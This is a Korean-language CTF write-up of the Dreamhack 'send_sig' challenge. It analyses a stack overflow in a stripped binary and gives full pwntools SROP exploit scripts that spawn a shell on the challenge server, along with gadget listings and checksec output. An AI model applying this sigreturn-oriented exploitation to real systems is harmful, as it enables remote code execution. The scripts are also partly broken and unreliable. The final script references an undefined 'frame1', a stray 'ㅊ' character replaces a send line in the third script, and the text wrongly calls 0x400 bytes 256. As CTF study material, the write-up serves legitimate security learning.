# Send_sig

파일을 받았는데 바이너리 파일 하나 밖에 없다.   

그리고 아래 멘트가 적혀져있다.   

```markdown
**서버로 signal을 보낼 수 있는 프로그램입니다!
프로그램의 취약점을 찾고, 익스플로잇해 flag를 읽어보세요.
flag는 home/send_sig/flag.txt에 있습니다.**
```

<br>

**분석**

일단 바로 실행을 시켜봤다.  

<br>

<img width="1340" height="194" alt="image (45)" src="https://github.com/user-attachments/assets/a9babe07-7677-4607-8283-b6695016ab02" />


그랬더니 이렇게 드림핵 서버에 시그널을 보낼 수 있다하고 Signal을 입력하게 해놨다.   

이것만으로는 부족하니 gdb로 들어가보자  

<br>

![image.png](attachment:d44b4b39-c112-4c43-9add-89958930ca90:image.png)
<img width="1257" height="405" alt="image (46)" src="https://github.com/user-attachments/assets/d112c70a-c26b-4e6d-b4f0-942ced4833dc" />

메인심볼이 없다.   

그래서 functions 정보를 봤더니 plt 에 등록된 저 네개가 끝이다. 
하는 수 없이 entry 로 들어가서 어떤 구조인지 확인해봤다  

<br>

<img width="1438" height="526" alt="image (47)" src="https://github.com/user-attachments/assets/a0164fc1-8ede-40de-a950-d5afc756b1d6" />
  
<img width="1428" height="564" alt="image (48)" src="https://github.com/user-attachments/assets/c974cf7e-1985-4e71-9ed2-284a4a4f2f66" />
  
<img width="1434" height="653" alt="image (49)" src="https://github.com/user-attachments/assets/f04eb8f1-56ea-4ac9-8623-e7972a8cc02c" />
  
<img width="1433" height="548" alt="image (50)" src="https://github.com/user-attachments/assets/c993f2ec-2813-42d8-9b07-5945a9fd9e0e" />   


여기 까지 봤을 때 알 수 있는 건   
그냥 아래 문자열을 출력하고 `0x4010b6` 에 있는 어떤 함수에 들어가서 Signal 을 입력받고 보내는 걸로 예상된다.      



```markdown
++++++++++++++++++Welcome to dreamhack++++++++++++++++++
+ You can send a signal to dreamhack server.           +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
```

`0x4010b6` 함수를 x/20i로 출력해봤다.  

<br>

<img width="1205" height="757" alt="image (51)" src="https://github.com/user-attachments/assets/9ed63b8a-dad0-4701-936c-a99fc4a00217" />

마지막 두줄부터 entry 로 진입한 주소가 나왔다.   


```markdown
pwndbg> x/20i 0x4010b6
   0x4010b6:    endbr64
   0x4010ba:    push   rbp
   0x4010bb:    mov    rbp,rsp
   0x4010be:    sub    rsp,0x10
   0x4010c2:    mov    edx,0x7
   0x4010c7:    lea    rsi,[rip+0xf3a]        # 0x402008
   0x4010ce:    mov    edi,0x1
   0x4010d3:    mov    eax,0x0
   0x4010d8:    call   0x401050 <write@plt>
=> 0x4010dd:    lea    rax,[rbp-0x8]
   0x4010e1:    mov    edx,0x400
   0x4010e6:    mov    rsi,rax
   0x4010e9:    mov    edi,0x0
   0x4010ee:    mov    eax,0x0
   0x4010f3:    call   0x401060 <read@plt>
   0x4010f8:    nop
   0x4010f9:    leave
   0x4010fa:    ret
```

여기서 이제 문제점이 보인다 => 부분을 보면 0x8 바이트 크기의 스택을 열어놨는데 read 호출에는 0x400 인 256 바이트를 받는다.   

오버플로우가 일어나니 여기서 취약점이 발생한다.   

<br>

<img width="1431" height="267" alt="image (52)" src="https://github.com/user-attachments/assets/109960f1-46ea-4765-834a-0295f36169f0" /> 
 
read 까지 가서 A 문자열을 입력해주고 저걸 보면 아무값 16바이트에 리턴주소에 원하는 흐름을 넣으면 되겠다.  

```markdown
pwndbg> checksec
File:     /home/alex030905/pwnable/SROP/send_sig/send_sig
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

Pie가 없고 파티션 렐로이니 주소는 그냥 쓰면 될 것 같고,   
flag 경로가 주어진 걸 봐선 flag 파일을 open 한 뒤 read, write 하면 답이 나올 것 같다.   

그러기 위해선 저 flag 경로를 먼저 어딘가에 써놔야하니까 아래 처럼 흐름을 짜봤다.  

- `read(0, bss, 0x100)`
- `open(bss, 0)`
- `read(3, bss+0x500, 0x40)`
- `write(1, bss+0x500, 0x40)`

이렇게 먼저 정리를 해주고 ROP 가젯을 찾아봤는데,   


```markdown
alex030905@Janghoon-GB3Ultra:~/pwnable/SROP/send_sig$ ROPgadget --binary ./send_sig
Gadgets information
============================================================
0x00000000004010f2 : add al, ch ; push -0x6f000001 ; leave ; ret
0x000000000040109e : add byte ptr [rax - 0x77], cl ; clc ; nop ; pop rbp ; ret
0x0000000000401016 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401000
0x000000000040109d : add byte ptr [rax], al ; mov qword ptr [rbp - 8], rax ; nop ; pop rbp ; ret
0x0000000000401018 : add dl, dh ; jmp 0x401000
0x00000000004010f7 : call qword ptr [rax + 0xff3c3c9]
0x000000000040101e : call qword ptr [rax - 0x5e1f00d]
0x00000000004010a2 : clc ; nop ; pop rbp ; ret
0x00000000004010a9 : cli ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010a6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010ad : in eax, 0x58 ; ret
0x000000000040101a : jmp 0x401000
0x00000000004010f9 : leave ; ret
0x00000000004010a0 : mov dword ptr [rbp - 8], eax ; nop ; pop rbp ; ret
0x00000000004010ac : mov ebp, esp ; pop rax ; ret
0x000000000040109f : mov qword ptr [rbp - 8], rax ; nop ; pop rbp ; ret
0x00000000004010ab : mov rbp, rsp ; pop rax ; ret
0x00000000004010f8 : nop ; leave ; ret
0x00000000004010a3 : nop ; pop rbp ; ret
0x00000000004010ae : pop rax ; ret
0x00000000004010a4 : pop rbp ; ret
0x00000000004010f4 : push -0x6f000001 ; leave ; ret
0x00000000004010aa : push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010a5 : ret
0x000000000040103b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040109c : sldt word ptr [rax] ; mov qword ptr [rbp - 8], rax ; nop ; pop rbp ; ret
0x00000000004010b0 : syscall

Unique gadgets found: 27
```

없다. rax rdi rsi rdx 각각 설정을 전부는 못해준다.  

그래서 레지스터를 다 설정해줄 수 있게 SROP 로 짜보자.   

- `0x00000000004010b0 : syscall`
- `0x00000000004010ae : pop rax ; ret`

이거 두개를 사용하자   

<br>


**실패함**

```python
from pwn import *

context.arch = 'x86_64'

p = remote('host8.dreamhack.games', 8443)
e = ELF('./send_sig')

read_got = e.got['read']

pop_rax = 0x4010ae
syscall = 0x4010b0

bss = e.bss()

# read(0, bss, 0x1000)
# syscall number : 0
frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rsi = bss
frame1.rdx = 0x1000
frame1.rdi = 0
frame1.rip = syscall
frame1.rsp = bss

payload = b'A' * 16
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)
payload += bytes(frame1)

p.recvuntil(b'Signal:')
p.sendline(payload)

# open(bss, 0)
# syscall number : ２
frame2 = SigreturnFrame()
frame2.rax = 2
frame2.rsi = 0
frame2.rdi = bss
frame2.rip = syscall
frame2.rsp = bss + 0x500

rop2 = p64(pop_rax)
rop2 += p64(15)
rop2 += bytes(frame2)
rop2 += b"/home/send_sig/flag.txt\x00"

p.sendline(rop2)

# read(3, bss+0x500, 0x40)
# syscall number : 0
frame3 = SigreturnFrame()
frame3.rax = 0
frame3.rsi = bss+0x500
frame3.rdx = 0x40
frame3.rdi = 3
frame3.rip = syscall
frame3.rsp = bss + 0x800

rop3 = p64(pop_rax)
rop3 += p64(15)
rop3 += bytes(frame3)

p.sendline(rop3)

# write(1, bss+0x500, 0x40)
# syscall number : １
frame4 = SigreturnFrame()
frame4.rax = 1
frame4.rsi = bss+0x500
frame4.rdi = 1
frame4.rdx = 0x40
frame4.rip = syscall
frame4.rsp = bss + 0x1000

rop4 = p64(pop_rax)
rop4 += p64(15)
rop4 += bytes(frame4)

p.sendline(rop4)
p.interactive()
```

분명 맞다 생각했는데 왜 안되는지 모르겠다.   
그래서 힌트를 조금 얻었는데,    

execve() 를 써서 한번에 쉘을 얻는다.   

<br>


<img width="1201" height="233" alt="image (53)" src="https://github.com/user-attachments/assets/3a505f4a-fcf0-4a93-bfc3-0502b075bdd4" />

보니까 이렇게 send_sig 실행 파일 안에 /bin/sh 가 있더라.  

너무 여러 단계로 쪼개서 생각했나보다.  
바로 쉘을 얻으러 가보자.     

<br>

**최종 코드**

```python
from pwn import *

context.arch = 'x86_64'

p = remote('host8.dreamhack.games', 8443)
e = ELF('./send_sig')

pop_rax = 0x4010ae
syscall = 0x4010b0
binsh = 0x402000

# execve('/bin/sh', 0, 0)
# syscall number : 0x3b
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsi = 0
frame.rdx = 0
frame.rdi = binsh
frame.rip = syscall

payload = b'A' * 16
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)
payload += bytes(frame1)

p.recvuntil(b'Signal:')
p.sendline(payload)

p.interactive()
```

![image.png](attachment:04883856-4fbe-4073-bf0d-153a11d82ee7:image.png)
<img width="1372" height="513" alt="image (54)" src="https://github.com/user-attachments/assets/ae842862-fc4e-4c18-a39d-e2562ba7e378" />

쉘을 얻었다.  

그리고 만약 binsh가 없었다해도,   

```python
from pwn import *

context.arch = 'x86_64'

p = remote('host1.dreamhack.games', 20155)          
#p = process('./send_sig')
e = ELF('./send_sig')

read_got = e.got['read']

pop_rax = 0x4010ae
syscall = 0x4010b0

bss = e.bss()

# read(0, bss, 0x1000)
# syscall number : 0
frame1 = SigreturnFrame()
frame1.rax = 0
frame1.rdi = 0
frame1.rsi = bss
frame1.rdx = 0x1000
frame1.rip = syscall
frame1.rsp = bss

payload = b'A' * 16
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall)
payload += bytes(frame1)

p.recvuntil(b'Signal:')
ㅊ

# execve(binsh, 0, 0)
# syscall number : 0x3b
frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b
frame2.rsp = bss + 0x500
frame2.rdi = bss + 0x110

payload = p64(pop_rax) # 8bytes
payload += p64(15) # 8 bytes
payload += p64(syscall) # 8 bytes
payload += bytes(frame2) # 0xf8, (248 bytes)
payload += b"/bin/sh\x00"

p.sendline(payload)

p.interactive()
```


<img width="1431" height="563" alt="image" src="https://github.com/user-attachments/assets/ec609039-3dce-42ad-8161-92b8cbe2497f" />

이렇게 쉘을 얻을 수 있다.   
